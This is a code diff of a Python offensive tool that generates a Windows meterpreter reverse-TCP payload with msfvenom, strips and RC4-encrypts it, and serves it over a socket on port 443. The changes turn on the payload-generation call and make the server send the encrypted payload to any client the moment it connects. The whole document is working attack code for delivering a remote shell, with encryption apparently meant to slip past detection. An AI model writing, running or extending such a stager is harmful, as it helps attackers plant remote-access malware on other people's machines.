@@ -9,11 +9,11 @@ import sys
 def create_payload_msfvenom(lhost, lport, file):
 	print('+ Creating payload ...')
 	
-	#system_call = 'msfvenom --arch x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -f python -o ' + file
+	system_call = 'msfvenom --arch x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -f python -o ' + file
 	#print('\n'+system_call+'\n')
 
-	#result = os.system(system_call)
-	result = 0
+	result = os.system(system_call)
+	#result = 0
 	if result == 0:
 		print('+ Payload created and saved as: ' + file)
 	else:
@@ -32,6 +32,7 @@ def clean_payload_msfvenom(file):
 		payload_readed = payload_readed.replace(' ','')
 		payload_readed = payload_readed.replace('\\x','')
 		payload_readed = payload_readed.replace('\n','')
+		print('+ Payload loaded and cleaned')
 
 		return payload_readed
 
@@ -43,6 +44,7 @@ def clean_payload_msfvenom(file):
 def encrypt_payload(payload, password):
 	obj = ARC4.new(password)
 	payload_encrypted = obj.encrypt(payload)
+	print('+ Payload RC4 encrypted')
 
 	return payload_encrypted
 
@@ -51,6 +53,7 @@ def encrypt_payload(payload, password):
 def decrypt_payload(payload_encrypted, password):
 	obj = ARC4.new(password)
 	payload_decrypted = obj.decrypt(payload_encrypted)
+	print('+ Payload RC4 decrypted')
 
 	return payload_decrypted
 
@@ -70,20 +73,25 @@ def create_socket(ip_address, port, payload_to_send):
 
 	with connection:
 		print('+ + Connected by ', client_address)
-		connection.sendall(b'Type "exit" to end session\n')
-		connection.sendall(b'Type "receive" to get the payload\n')
-		while True:
-			data = connection.recv(1024)
-			message = data.decode('utf-8')
-			if message == 'exit\n':
-				print('+ + Session exited by client!!')
-				sock.close()
-				break
-			elif message == 'receive\n':
-				print('+ + Sending payload to client ...')
-				connection.sendall(payload_to_send)
-			else:
-				print(message)
+		#connection.sendall(b'Type "exit" to end session\n')
+		#connection.sendall(b'Type "receive" to get the payload\n')
+		print('+ + Sending payload to client ...')
+		connection.sendall(payload_to_send)
+		print('+ + Payload sent ...')
+		#connection.sendall(b'Hola\n')
+		# while True:
+		# 	data = connection.recv(1024)
+		# 	message = data.decode('utf-8')
+		# 	if message == 'exit\n':
+		# 		print('+ + Session exited by client!!')
+		# 		sock.close()
+		# 		break
+		# 	elif message == 'receive\n':
+		# 		print('+ + Sending payload to client ...')
+		# 		#connection.sendall(payload_to_send)
+		# 		connection.sendall(b'Hola\n')
+		# 	else:
+		# 		print(message)
 
 #--------------------------------------------------------------------------------------------------------------
 
@@ -104,14 +112,25 @@ if __name__ == '__main__':
 	print('\n')
 	write_screen("Script started")
 
+	#password for RC4 crypter
 	password = 'spiderman'
-	ip_address = '0.0.0.0'
-	port = 4567
 
-	create_payload_msfvenom('192.168.1.50','4444', 'payload.txt')
+	#IP address and port for socket to send backport payload
+	ip_address = '0.0.0.0'
+	port = 443
+
+	#IP address and port for meterpreter reverse sessión
+	lhost = '192.168.1.50'
+	lport = '4444'
+
+	#File to save payload
+	file = 'payload.txt'
+
+	#Create payload with msfvenom
+	create_payload_msfvenom(lhost, lport, file)
 
 #	print("\n\n--------------------------------------------------------------------------------------------------------------")
-	payload_cleaned = clean_payload_msfvenom('payload.txt')
+	payload_cleaned = clean_payload_msfvenom(file)
 #	print(payload_cleaned)
 
 #	print("\n\n--------------------------------------------------------------------------------------------------------------")
